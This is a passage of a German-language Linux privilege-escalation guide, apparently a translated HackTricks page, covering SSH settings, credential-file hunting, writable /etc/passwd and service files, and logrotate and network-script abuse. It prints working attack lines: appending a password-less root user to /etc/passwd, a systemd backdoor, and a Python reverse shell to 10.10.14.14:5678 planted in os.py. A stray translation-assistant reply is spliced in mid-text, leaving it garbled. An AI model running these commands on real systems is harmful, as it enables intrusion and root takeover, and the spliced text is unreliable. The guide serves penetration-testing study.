- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt diese Option fest, ob der Server Logins zu Konten mit leeren Passwort-Strings zulässt. Der Standard ist `no`.

### PermitRootLogin

Legt fest, ob root sich per ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: root kann sich nur mit private key anmelden und nur, wenn die command-Optionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Legt Dateien fest, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration bedeutet, dass ssh beim Versuch, sich mit dem **private** Key des Benutzers "**testusername**" einzuloggen, den public Key deines Keys mit denjenigen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding erlaubt es dir, **use your local SSH keys instead of leaving keys** (ohne Passphrasen!) auf deinem Server liegen zu lassen. Du wirst also in der Lage sein, **jump** via ssh **to a host** und von dort **jump to another** host **using** den **key**, der sich auf deinem **initial host** befindet.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host in der Lage sein wird, auf die keys zuzugreifen (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.  
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profile-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eines davon **schreiben oder ändern kannst, kannst du escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** prüfen.

### Passwd/Shadow Dateien

Je nach OS können die `/etc/passwd` und `/etc/shadow` Dateien einen anderen Namen haben oder es kann ein Backup geben. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findest du **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten Datei).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Datei src/linux-hardening/privilege-escalation/README.md nicht erhalten. Bitte füge den Inhalt hier ein oder lade die Datei hoch.

Außerdem kläre bitte:
- Soll ich jetzt ein sicheres Passwort generieren? (z. B. 16 Zeichen, alphanumerisch + Symbole)
- Soll die Ausgabe die übersetzte README sein mit einer zusätzlichen Zeile/Abschnitt, der den Benutzer `hacker` anlegt und das generierte Passwort enthält? Oder möchtest du stattdessen konkrete Befehle (useradd, passwd, etc.)?

Sobald du den Inhalt und die Präferenz lieferst, übersetze ich den Text ins Deutsche und füge den Benutzer `hacker` samt generiertem Passwort wie gewünscht ein.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Zum Beispiel: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch könnte die aktuelle Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Sie sollten prüfen, ob Sie in einige sensible Dateien **schreiben können**. Zum Beispiel: Können Sie in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du die **Tomcat-Dienstkonfigurationsdatei in /etc/systemd/,** ändern kannst, dann kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Schau dir den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) an; er durchsucht **mehrere mögliche Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — eine Open-Source-Anwendung, mit der viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac ausgelesen werden können.

### Logs

Wenn man Logs lesen kann, kann man möglicherweise **interessante/vertrauliche Informationen darin** finden. Je seltsamer das Log ist, desto interessanter wird es (wahrscheinlich).\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es erlauben, **Passwörter in audit logs zu protokollieren**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und emails in Logs oder nach Hashes/regexps schauen.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Schreibbare Dateien

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Um **die Library zu backdooren** füge einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT anpassen):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibberechtigungen** auf eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das häufig als **root** läuft, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Weitere detaillierte Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** also wenn Sie feststellen, dass Sie Logs ändern können, prüfen Sie, wer diese Logs verwaltet und ob Sie Privilegien eskalieren können, indem Sie die Logs durch symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer in der Lage ist, ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ zu **schreiben** **oder** ein vorhandenes anzupassen, dann ist Ihr **System pwned**.

Network-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie auf Linux vom Network Manager (dispatcher.d) ~sourced~.

In meinem Fall wird das Attribut `NAME=` in diesen Network-Skripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: Das Leerzeichen zwischen Network und /bin/id beachten_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` beherbergt **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es enthält Skripte, um Services zu `start`, `stop`, `restart` und manchmal `reload`. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits ist `/etc/init` mit **Upstart** verknüpft, einem neueren **Dienstverwaltungs**-System, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Dienstverwaltungsaufgaben nutzt. Trotz der Umstellung auf Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin parallel zu Upstart-Konfigurationen verwendet.

**systemd** hat sich als moderner Init- und Service-Manager etabliert und bietet erweiterte Funktionen wie bedarfsgesteuertes Starten von Daemons, Verwaltung von Automounts und Snapshots des Systemzustands. Es ordnet Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoranpassungen, was die Systemadministration vereinfacht.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android-rooting-Frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität einem userspace manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-order oder schwache Passwortschemata) kann einer lokalen App ermöglichen, den Manager zu impersonate und auf bereits gerooteten Geräten root zu erlangen. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Commandlines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zu permissive Patterns (z. B. Verwendung von \S) können auf von Angreifern abgelegte Listener in beschreibbaren Orten (z. B. /tmp/httpd) passen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Mehr dazu und ein verallgemeinertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool, um nach Linux local privilege escalation vectors zu suchen:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert kernel vulns in Linux und MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
